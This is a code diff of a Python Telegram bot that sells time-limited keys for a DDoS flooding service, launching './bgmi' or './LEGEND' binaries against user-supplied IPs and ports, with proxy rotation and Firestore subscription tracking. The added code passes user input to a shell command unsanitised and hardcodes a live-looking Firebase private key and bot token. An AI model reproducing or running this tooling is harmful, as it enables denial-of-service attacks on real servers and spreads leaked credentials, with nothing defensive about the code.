@@ -1,250 +1,437 @@
 
-
+import telebot
 import subprocess
-import json
-import os
-import random
-import string
-import datetime
-from telegram import Update
-from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
-from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME
+import firebase_admin
+from firebase_admin import credentials, firestore
+from datetime import datetime, timedelta, timezone
+import secrets
+import time
+import threading
+import requests
+import itertools
+
+# Firebase credentials (note: the private key should be stored securely)
+firebase_credentials = {
+  "type": "service_account",
+  "project_id": "myrule-c945e",
+  "private_key_id": "276540b416d105a36aa6cb50b955aa2d80bb3768",
+  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCeOARbFjVM8EAh\n0yzSwOMvKs6sE/ZTjPgadcX59hMzhya2O3KONuM2tIPQZaZaFqe5F7ebN/bnpaxg\nI3T6HOJwMMBdIHmjFoYfk2TGrPg0o6YP7Kowl6xX0jtqEU9x7IazgRX+QXzv9hag\nVKYPfWUeFBKT/j0PbF1N+KvtRkrMwWDtjBfMHt/iMlAowj0G3cLyrPooJaQ3EXK/\nmOVTSe/iI24VBViZ4cQqO0keYQ5bQNWdlaTdY9nFqOwBTh2wqK3XqNF0F2mLcU04\nvdvIxu4k3qPkvjmqkQUP3T+DuESqjiUoi1kz2oqB85Xdyk0XdK0mXPJoYBwuPLe8\nye//YJeHAgMBAAECggEABINpkGWeSJ8T3UMmZK6u7GIGuj7piHGdhDe22Y4M9yvU\nTV99wZPMQHu+xNuZdrltuGh2St26U9pUg/uO8zGOvg+N9TofbikO02jDd61oeSvv\n6UVhh3hUKL8tBbYPs5rBLu6wP2wD0d6Nv64afJehok2FSCZ4/G8lbDt7QA4AxT11\nbkpNd1aECjCO64ZKoVJa0XcdabDgFpoIAQ16h2jxCpwsWoOBkIz/OYGCFcIUZaS3\nfBjUomgchj5ytuL1537A0iQRG/llgXvbcCNLKVDP0JWTEHz/fRVa0zmL99SY1+0q\nanA/7IKwXcX37Ay9SSYxGe4O2y/BKWTqAkAV/ccEzQKBgQDasM1lwRBItXCSpB32\n5lEkuM87jQTNaBoCm67EK6JIQ+6oFSeDyScWAQmPVZcUX7rw6iBsJy+145F2AdYW\nFH23OAtHTxWDn2xwvq1o3QxxeeagMwaLPpQehpKm9usYEIzPn4389nVL9kVz+1Je\naDPYirYFuQ/pEpkC2UssNGUoqwKBgQC5NiPa967jwweP6E0pfgJuddpWflUcK1AW\nx1lPP7Dnj0A2ZcPwmvlKVbwWCsTjfp9qCGIE2W5HTPkishOd1XQcozDqeQQpCVeD\nIJ0tV8YbzPGgaGFY04g+kxmL+AM9X3bYkVHvwG1FmlrZYAQKFjtAFdhAHPupveWn\nck4wMhfElQKBgQCRzKATv+SIZRb5XRtxGVpt3hyjekACZe45YOvic6jM/yVkwD3I\n+dnqLKTf/9MqzSwIJD+be4CuhlrbTxwZOm4aMe4rC4mvaCFXBXj9WapLGVdt5Lbv\nLLh5pYSudh6Eu7v1TE3QocvP6g+h5KOkt1ohe1EhfaEi5bhHkvEwNnpe4wKBgA9Z\n5W7oyJ4oNCBBaOPfheQR8J7qqbNEA8dfjo96//axcOkRVkRDFBaNNKG/EsKoZB4t\nw7ITM4jFYID3sZiLcKxO+mb00Nt14sMDmQOBGvKC8iQRgsASCGDnYF6xl9MmbntU\n0C3HDUePm6gYxTzwyshtBxeJT3KqQra2SrTD8iRhAoGBAKQo7o7WQbWYMakZr4tN\n3nthN3/TDhwpFmXYNcpf0IMIfH3BNyqAX2NkCQA/0SJU4y4rfC2fUfh0KFI22HzB\n/C0s7jJ0ymdQcDe53c6JAi5ojS9JkHZ/lwY5rKjsKdfZiQqO+efW6m9C+UkDVEHA\n1anWwaJW9f1hDGQpP27Pvmrx\n-----END PRIVATE KEY-----\n",
+  "client_email": "firebase-adminsdk-vgj7w@myrule-c945e.iam.gserviceaccount.com",
+  "client_id": "112191264318837162299",
+  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
+  "token_uri": "https://oauth2.googleapis.com/token",
+  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
+  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-vgj7w%40myrule-c945e.iam.gserviceaccount.com",
+  "universe_domain": "googleapis.com"
+}
 
 
-USER_FILE = "../users.json"
-KEY_FILE = "../keys.json"
-
-flooding_process = None
-flooding_command = None
 
 
-DEFAULT_THREADS = 150
+# Initialize Firebase
+cred = credentials.Certificate(firebase_credentials)
+firebase_admin.initialize_app(cred)
+db = firestore.client()
 
+bot_token = '7678781870:AAEdEokUHXR7fzyULq5oY7-dNXt3tcdo6vw'  # Replace with your bot token
+proxy_api_url = 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http,socks4,socks5&timeout=500&country=all&ssl=all&anonymity=all'
 
-users = {}
-keys = {}
+# Global iterator for proxies
+proxy_iterator = None
+current_proxy = None
 
-
-def load_data():
-    global users, keys
-    users = load_users()
-    keys = load_keys()
-
-def load_users():
+def get_proxies():
+    global proxy_iterator
     try:
-        with open(USER_FILE, "r") as file:
-            return json.load(file)
-    except FileNotFoundError:
-        return {}
+        response = requests.get(proxy_api_url)
+        if response.status_code == 200:
+            proxies = response.text.splitlines()
+            if proxies:
+                proxy_iterator = itertools.cycle(proxies)
+                return proxy_iterator
     except Exception as e:
-        print(f"Error loading users: {e}")
-        return {}
+        print(f"Error fetching proxies: {str(e)}")
+    return None
 
-def save_users():
-    with open(USER_FILE, "w") as file:
-        json.dump(users, file)
+def get_next_proxy():
+    global proxy_iterator
+    if proxy_iterator is None:
+        proxy_iterator = get_proxies()
+    return next(proxy_iterator, None)
 
-def load_keys():
-    try:
-        with open(KEY_FILE, "r") as file:
-            return json.load(file)
-    except FileNotFoundError:
-        return {}
-    except Exception as e:
-        print(f"Error loading keys: {e}")
-        return {}
-
-def save_keys():
-    with open(KEY_FILE, "w") as file:
-        json.dump(keys, file)
-
-def generate_key(length=6):
-    characters = string.ascii_letters + string.digits
-    return ''.join(random.choice(characters) for _ in range(length))
-
-def add_time_to_current_date(hours=0, days=0):
-    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')
-
-# Command to generate keys
-async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    user_id = str(update.message.from_user.id)
-    if user_id in ADMIN_IDS:
-        command = context.args
-        if len(command) == 2:
-            try:
-                time_amount = int(command[0])
-                time_unit = command[1].lower()
-                if time_unit == 'hours':
-                    expiration_date = add_time_to_current_date(hours=time_amount)
-                elif time_unit == 'days':
-                    expiration_date = add_time_to_current_date(days=time_amount)
-                else:
-                    raise ValueError("Invalid time unit")
-                key = generate_key()
-                keys[key] = expiration_date
-                save_keys()
-                response = f"Key generated: {key}\nExpires on: {expiration_date}"
-            except ValueError:
-                response = "Please specify a valid number and unit of time (hours/days) script by @BGS_AYUSH."
-        else:
-            response = "Usage: /genkey <amount> <hours/days>"
-    else:
-        response = "ONLY OWNER CAN USE💀OWNER @LDX_COBRA..."
-
-    await update.message.reply_text(response)
-
-
-async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    user_id = str(update.message.from_user.id)
-    command = context.args
-    if len(command) == 1:
-        key = command[0]
-        if key in keys:
-            expiration_date = keys[key]
-            if user_id in users:
-                user_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
-                new_expiration_date = max(user_expiration, datetime.datetime.now()) + datetime.timedelta(hours=1)
-                users[user_id] = new_expiration_date.strftime('%Y-%m-%d %H:%M:%S')
-            else:
-                users[user_id] = expiration_date
-            save_users()
-            del keys[key]
-            save_keys()
-            response = f"✅Key redeemed successfully! Access granted until: {users[user_id]} OWNER- @RAHUL_DDOS_B"
-        else:
-            response = "Invalid or expired key buy from @RAHUL_DDOS_B"
-    else:
-        response = "Usage: /redeem <key>"
-
-    await update.message.reply_text(response)
-
-
-async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    user_id = str(update.message.from_user.id)
-    if user_id in ADMIN_IDS:
-        if users:
-            response = "Authorized Users:\n"
-            for user_id, expiration_date in users.items():
+def rotate_proxy(sent_message):
+    global current_proxy
+    while sent_message.time_remaining > 0:
+        new_proxy = get_next_proxy()
+        if new_proxy:
+            current_proxy = new_proxy
+            bot.proxy = {
+                'http': f'http://{new_proxy}',
+                'https': f'https://{new_proxy}'
+            }
+            if sent_message.time_remaining > 0:
+                new_text = f"🚀⚡ ATTACK STARTED⚡🚀\n\n🎯 Target: {sent_message.target}\n🔌 Port: {sent_message.port}\n⏰ Time: {sent_message.time_remaining} Seconds\n🛡️ Proxy: {current_proxy}\n"
                 try:
-                    user_info = await context.bot.get_chat(int(user_id))
-                    username = user_info.username if user_info.username else f"UserID: {user_id}"
-                    response += f"- @{username} (ID: {user_id}) expires on {expiration_date}\n"
-                except Exception:
-                    response += f"- User ID: {user_id} expires on {expiration_date}\n"
-        else:
-            response = "No data found"
-    else:
-        response = "ONLY OWNER CAN USE."
-    await update.message.reply_text(response)
+                    bot.edit_message_text(new_text, chat_id=sent_message.chat.id, message_id=sent_message.message_id)
+                except telebot.apihelper.ApiException as e:
+                    if "message is not modified" not in str(e):
+                        print(f"Error updating message: {str(e)}")
+        time.sleep(5)
 
+bot = telebot.TeleBot(bot_token)
 
-async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    global flooding_command
-    user_id = str(update.message.from_user.id)
+ADMIN_ID = 7017469802    # Replace with the actual admin's user ID
 
-    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
-        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key. Buy key from @LDX_COBRA")
-        return
+def generate_one_time_key():
+    return secrets.token_urlsafe(16)
 
-    if len(context.args) != 3:
-        await update.message.reply_text('Usage: /bgmi <target_ip> <port> <duration>')
-        return
+def validate_key(key):
+    doc_ref = db.collection('keys').document(key)
+    doc = doc_ref.get()
+    if doc.exists and not doc.to_dict().get('used', False):
+        return True, doc_ref
+    return False, None
 
-    target_ip = context.args[0]
-    port = context.args[1]
-    duration = context.args[2]
+def set_key_as_used(doc_ref):
+    doc_ref.update({'used': True})
 
-    flooding_command = ['./bgmi', target_ip, port, duration, str(DEFAULT_THREADS)]
-    await update.message.reply_text(f'Flooding parameters set: {target_ip}:{port} for {duration} seconds with {DEFAULT_THREADS} threads.OWMER- @LDX_COBRA.')
+def check_key_expiration(user_ref):
+    user_doc = user_ref.get()
+    if user_doc.exists:
+        user_data = user_doc.to_dict()
+        expiry_date = user_data.get('expiry_date')
+        if expiry_date:
+            now = datetime.now(timezone.utc)  # Make current time offset-aware
+            if now > expiry_date:
+                # Key has expired
+                user_ref.update({'valid': False})
+                return False
+            return user_data.get('valid', False)
+    return False
 
+@bot.message_handler(commands=['start'])
+def handle_start(message):
+    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
+    markup.add(
+        telebot.types.KeyboardButton("🔥 Attack"),
+        telebot.types.KeyboardButton("🛑 Stop"),
+        telebot.types.KeyboardButton("📞 Contact Admin"),
+        telebot.types.KeyboardButton("🔑 Generate Key"),
+        telebot.types.KeyboardButton("📋 Paste Key"),
+        telebot.types.KeyboardButton("👤 My Account"),
+        telebot.types.KeyboardButton("⚙️ Admin Panel")
+    )
+    bot.send_message(message.chat.id, "Choose an option:", reply_markup=markup)
 
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    global flooding_process, flooding_command
-    user_id = str(update.message.from_user.id)
+@bot.message_handler(func=lambda message: True)
+def handle_message(message):
+    if message.text == "🔥 Attack":
+        handle_attack_init(message)
+    elif message.text == "🛑 Stop":
+        handle_stop(message)
+    elif message.text == "📞 Contact Admin":
+        handle_contact_admin(message)
+    elif message.text == "🔑 Generate Key":
+        handle_generate_key(message)
+    elif message.text == "📋 Paste Key":
+        handle_paste_key(message)
+    elif message.text == "👤 My Account":
+        handle_my_account(message)
+    elif message.text == "⚙️ Admin Panel":
+        handle_admin_panel(message)
+    elif message.text == "🔙 Back":
+        handle_start(message)
+    elif message.text == "❌ Delete Key":
+        handle_delete_key_prompt(message)
+    elif message.text == "🗑️ Delete All":
+        handle_delete_all(message)
 
-    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
-        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key.buy key from- @LDX_COBRA")
-        return
+def handle_attack_init(message):
+    bot.send_message(message.chat.id, "Enter the target IP, port, and time in the format: <IP> <port> <time>")
+    bot.register_next_step_handler(message, process_attack)
 
-    if flooding_process is not None:
-        await update.message.reply_text('❌𝐀𝐓𝐓𝐀𝐂𝐊 𝐀𝐋𝐑𝐄𝐀𝐃𝐘 𝐑𝐔𝐍𝐍𝐈𝐍𝐆❌.')
-        return
-
-    if flooding_command is None:
-        await update.message.reply_text('No flooding parameters set. Use /bgmi to set parameters.')
-        return
-
-    flooding_process = subprocess.Popen(flooding_command)
-    await update.message.reply_text('🚀𝑨𝑻𝑻𝑨𝑪𝑲 𝑺𝑻𝑨𝑹𝑻𝑬𝑫...🚀')
-
-
-async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    global flooding_process
-    user_id = str(update.message.from_user.id)
-
-    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
-        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key.buy key from- @LDX_COBRA")
-        return
-
-    if flooding_process is None:
-        await update.message.reply_text('No flooding process is running.OWNER @LDX_COBRA...')
-        return
-
-    flooding_process.terminate()
-    flooding_process = None
-    await update.message.reply_text('𝑨𝑻𝑻𝑨𝑪𝑲 𝑺𝑻𝑶𝑷𝑬𝑫...✅')
-
-
-async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    user_id = str(update.message.from_user.id)
-    if user_id in ADMIN_IDS:
-        message = ' '.join(context.args)
-        if not message:
-            await update.message.reply_text('Usage: /broadcast <message>')
+def process_attack(message):
+    try:
+        command_parts = message.text.split()
+        if len(command_parts) < 3:
+            bot.reply_to(message, "Usage: <IP> <port> <time>")
             return
 
-        for user in users.keys():
-            try:
-                await context.bot.send_message(chat_id=int(user), text=message)
-            except Exception as e:
-                print(f"Error sending message to {user}: {e}")
-        response = "Message sent to all users."
+        username = message.from_user.username
+        user_id = message.from_user.id
+        target = command_parts[0]
+        port = command_parts[1]
+        attack_time = int(command_parts[2])
+
+        user_ref = db.collection('users').document(str(user_id))
+        if not check_key_expiration(user_ref):
+            bot.reply_to(message, "🚫 Your subscription has expired or is invalid.")
+            return
+
+        response = f"@{username}\n⚡ ATTACK STARTED ⚡\n\n🎯 Target: {target}\n🔌 Port: {port}\n⏰ Time: {attack_time} Seconds\n🛡️ Proxy: {current_proxy}\n"
+        sent_message = bot.reply_to(message, response)
+        sent_message.target = target
+        sent_message.port = port
+        sent_message.time_remaining = attack_time
+
+        # Start attack immediately in a separate thread
+        attack_thread = threading.Thread(target=run_attack, args=(target, port, attack_time, sent_message))
+        attack_thread.start()
+
+        # Start updating remaining time in another thread
+        time_thread = threading.Thread(target=update_remaining_time, args=(attack_time, sent_message))
+        time_thread.start()
+
+        # Start rotating proxies in a separate thread
+        proxy_thread = threading.Thread(target=rotate_proxy, args=(sent_message,))
+        proxy_thread.start()
+
+    except Exception as e:
+        bot.reply_to(message, f"⚠️ An error occurred: {str(e)}")
+
+def run_attack(target, port, attack_time, sent_message):
+    try:
+        full_command = f"./LEGEND {target} {port} {attack_time} "
+        subprocess.run(full_command, shell=True)
+
+        sent_message.time_remaining = 0
+        final_response = f"🚀⚡ ATTACK FINISHED⚡🚀"
+        try:
+            bot.edit_message_text(final_response, chat_id=sent_message.chat.id, message_id=sent_message.message_id)
+        except telebot.apihelper.ApiException as e:
+            if "message is not modified" not in str(e):
+                print(f"Error updating message: {str(e)}")
+
+    except Exception as e:
+        bot.send_message(sent_message.chat.id, f"⚠️ An error occurred: {str(e)}")
+
+def update_remaining_time(attack_time, sent_message):
+    global current_proxy
+    last_message_text = None
+    for remaining in range(attack_time, 0, -1):
+        if sent_message.time_remaining > 0:
+            sent_message.time_remaining = remaining
+            new_text = f"🚀⚡ ATTACK STARTED⚡🚀\n\n🎯 Target: {sent_message.target}\n🔌 Port: {sent_message.port}\n⏰ Time: {remaining} Seconds\n🛡️ Proxy: {current_proxy}\n"
+            
+            # Update the message only if the new text is different from the last message text
+            if new_text != last_message_text:
+                try:
+                    bot.edit_message_text(new_text, chat_id=sent_message.chat.id, message_id=sent_message.message_id)
+                    last_message_text = new_text
+                except telebot.apihelper.ApiException as e:
+                    if "message is not modified" not in str(e):
+                        print(f"Error updating message: {str(e)}")
+        
+        time.sleep(1)
+
+    # Once the loop is finished, indicate the attack is finished without showing the details box
+    final_response = f"🚀⚡ ATTACK FINISHED⚡🚀"
+    try:
+        if final_response != last_message_text:
+            bot.edit_message_text(final_response, chat_id=sent_message.chat.id, message_id=sent_message.message_id)
+    except telebot.apihelper.ApiException as e:
+        if "message is not modified" not in str(e):
+            print(f"Error updating message: {str(e)}")
+
+def handle_stop(message):
+    subprocess.run("pkill -f LEGEND", shell=True)
+    bot.reply_to(message, "🛑 Attack stopped.")
+
+def handle_contact_admin(message):
+    bot.reply_to(message, f"📞 @Naina_Pagal: {ADMIN_ID}")
+
+def handle_generate_key(message):
+    if message.from_user.id == ADMIN_ID:
+        bot.send_message(message.chat.id, "Enter the duration for the key in the format: <days> <hours> <minutes> <seconds>")
+        bot.register_next_step_handler(message, process_generate_key)
     else:
-        response = "ONLY OWNER CAN USE."
-    
-    await update.message.reply_text(response)
+        bot.reply_to(message, "🚫 You do not have permission to generate keys.")
 
+def process_generate_key(message):
+    try:
+        parts = message.text.split()
+        if len(parts) != 4:
+            bot.reply_to(message, "Usage: <days> <hours> <minutes> <seconds>")
+            return
 
-async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    response = (
-        "Welcome to the Flooding Bot by @{OWNER_USERNAME}..! Here are the available commands:\n\n"
-        "Admin Commands:\n"
-        "/genkey <amount> <hours/days> - Generate a key with a specified validity period.\n"
-        "/allusers - Show all authorized users.\n"
-        "/broadcast <message> - Broadcast a message to all authorized users.\n\n"
-        "User Commands:\n"
-        "/redeem <key> - Redeem a key to gain access.\n"
-        "/bgmi <target_ip> <port> <duration> - Set the flooding parameters.\n"
-        "/start - Start the flooding process.\n"
-        "/stop - Stop the flooding process.\n"
-    )
-    await update.message.reply_text(response)
+        days = int(parts[0])
+        hours = int(parts[1])
+        minutes = int(parts[2])
+        seconds = int(parts[3])
+        expiry_date = datetime.now(timezone.utc) + timedelta(days=days, hours=hours, minutes=minutes, seconds=seconds)
 
-def main() -> None:
-    application = ApplicationBuilder().token(BOT_TOKEN).build()
+        key = f"GENERATED_{generate_one_time_key()}"
+        db.collection('keys').document(key).set({'expiry_date': expiry_date, 'used': False})
 
-    application.add_handler(CommandHandler("genkey", genkey))
-    application.add_handler(CommandHandler("redeem", redeem))
-    application.add_handler(CommandHandler("allusers", allusers))
-    application.add_handler(CommandHandler("bgmi", bgmi))
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("stop", stop))
-    application.add_handler(CommandHandler("broadcast", broadcast))
-    application.add_handler(CommandHandler("help", help_command))
+        bot.reply_to(message, f"🔑 Generated Key: `{key}`", parse_mode='Markdown')
+    except Exception as e:
+        bot.reply_to(message, f"⚠️ An error occurred: {str(e)}")
 
-    load_data()
-    application.run_polling()
+def handle_paste_key(message):
+    bot.send_message(message.chat.id, "🔑 Enter the key:")
+    bot.register_next_step_handler(message, process_paste_key)
 
-if __name__ == '__main__':
-    main()
-#BGS_MODS
+def process_paste_key(message):
+    key = message.text
+    valid, doc_ref = validate_key(key)
+    if valid:
+        # Get the current user's ID and username
+        user_id = str(message.from_user.id)
+        username = message.from_user.username or "UNKNOWN"
+
+        # Set the key as used and update the user information
+        set_key_as_used(doc_ref)
+
+        # Update the key document with the user who validated the key
+        doc_ref.update({
+            'user_id': user_id,
+            'username': username
+        })
+
+        # Get the expiry date from the key document
+        expiry_date = doc_ref.get().to_dict().get('expiry_date')
+
+        # Update the user's document in the 'users' collection
+        db.collection('users').document(user_id).set({
+            'valid': True,
+            'expiry_date': expiry_date
+        }, merge=True)
+
+        bot.reply_to(message, "✅ Key validated. You can now use the attack feature.")
+    else:
+        bot.reply_to(message, "❌ Invalid or used key.")
+
+def handle_my_account(message):
+    user_id = str(message.from_user.id)
+    user_ref = db.collection('users').document(user_id)
+
+    if not check_key_expiration(user_ref):
+        bot.reply_to(message, "🚫 Your subscription has expired or is invalid.")
+        return
+
+    user_doc = user_ref.get()
+    if user_doc.exists:
+        user_data = user_doc.to_dict()
+        bot.reply_to(message, f"👤 Account info:\n✅ Valid: {user_data['valid']}\n📅 Expiry Date: {user_data['expiry_date']}")
+    else:
+        bot.reply_to(message, "❓ No account information found.")
+
+def handle_admin_panel(message):
+    if message.from_user.id == ADMIN_ID:
+        bot.send_message(message.chat.id, "⚙️ Fetching data... Please wait.")
+        time.sleep(1)
+
+        keys = db.collection('keys').stream()
+        user_keys_info = []
+        keys_dict = {}
+
+        for idx, key in enumerate(keys):
+            key_data = key.to_dict()
+            key_id = key.id
+            user_id = key_data.get('user_id', 'N/A')
+            username = key_data.get('username', 'N/A')
+            used = key_data.get('used', 'N/A')
+            expiry_date = key_data.get('expiry_date', 'N/A')
+            
+            user_keys_info.append(f"{idx + 1}. 🔑 Key: {key_id}\n   👤 UserID: {user_id}\n   🧑 Username: {username}\n   🔄 Used: {used}\n   📅 Expiry: {expiry_date}\n")
+            keys_dict[idx + 1] = key_id
+
+        if not hasattr(bot, 'user_data'):
+            bot.user_data = {}
+        bot.user_data[message.chat.id] = keys_dict
+
+        chunk_size = 10
+        for i in range(0, len(user_keys_info), chunk_size):
+            chunk = user_keys_info[i:i + chunk_size]
+            bot.send_message(message.chat.id, "\n".join(chunk))
+
+        markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
+        markup.add(
+            telebot.types.KeyboardButton("🔙 Back"),
+            telebot.types.KeyboardButton("❌ Delete Key"),
+            telebot.types.KeyboardButton("🗑️ Delete All")
+        )
+        bot.send_message(message.chat.id, "Choose an option:", reply_markup=markup)
+    else:
+        bot.reply_to(message, "🚫 You do not have permission to access the admin panel.")
+
+def handle_delete_key_prompt(message):
+    bot.send_message(message.chat.id, "Enter the key number to delete:")
+    bot.register_next_step_handler(message, process_delete_key)
+
+def process_delete_key(message):
+    try:
+        key_number = int(message.text)
+        keys_dict = bot.user_data.get(message.chat.id, {})
+
+        if key_number in keys_dict:
+            key_id = keys_dict[key_number]
+            key_doc = db.collection('keys').document(key_id)
+            key_data = key_doc.get().to_dict()
+
+            if key_data:
+                user_id = key_data.get('user_id', 'N/A')
+
+                # Delete the key and revoke the user's access
+                key_doc.delete()
+
+                if user_id != 'N/A':
+                    db.collection('users').document(user_id).update({'valid': False})
+                    bot.reply_to(message, f"❌ Key {key_id} deleted and user access revoked.")
+                else:
+                    bot.reply_to(message, "⚠️ Invalid user ID associated with the key.")
+            else:
+                bot.reply_to(message, "❓ Key not found.")
+        else:
+            bot.reply_to(message, "❌ Invalid key number.")
+    except ValueError:
+        bot.reply_to(message, "Please enter a valid key number.")
+    except Exception as e:
+        bot.reply_to(message, f"⚠️ An error occurred: {str(e)}")
+
+def handle_delete_all_prompt(message):
+    bot.send_message(message.chat.id, "Are you sure you want to delete all keys and revoke all users? Type 'Yes' to confirm.")
+    bot.register_next_step_handler(message, process_delete_all)
+
+def process_delete_all(message):
+    if message.text.lower() == 'yes':
+        try:
+            # Delete all keys
+            keys = db.collection('keys').stream()
+            for key in keys:
+                key_data = key.to_dict()
+                user_id = key_data.get('user_id', 'N/A')
+                key.reference.delete()
+
+                # Revoke user access if user_id is valid
+                if user_id != 'N/A':
+                    user_ref = db.collection('users').document(user_id)
+                    user_ref.update({'valid': False})
+
+            bot.reply_to(message, "🗑️ All keys deleted and all user accesses revoked.")
+        except Exception as e:
+            bot.reply_to(message, f"⚠️ An error occurred: {str(e)}")
+    else:
+        bot.reply_to(message, "❌ Operation canceled.")
+
+@bot.message_handler(func=lambda message: message.text == "🗑️ Delete All")
+def handle_delete_all(message):
+    if message.from_user.id == ADMIN_ID:
+        handle_delete_all_prompt(message)
+    else:
+        bot.reply_to(message, "🚫 You do not have permission to perform this action.")
+
+# Start polling
+bot.polling()
+# Ensuring the bot stays online and responsive by catching exceptions
+while True:
+    try:
+        bot.polling(none_stop=True, timeout=60)  # Added timeout to avoid long blocks
+    except Exception as e:
+        print(f"Error: {e}")
+
+while True:
+    try:
+        bot.polling(none_stop=True)
+    except Exception as e:
+        print(e)
